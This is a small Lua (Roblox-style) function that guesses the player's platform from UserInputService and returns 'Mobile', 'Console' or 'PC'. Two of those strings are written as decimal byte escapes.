local function getPlatform()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then return "\77\111\98\105\108\101"
    elseif UserInputService.GamepadEnabled then return "\67\111\110\115\111\108\101"
    else return "PC" end
end

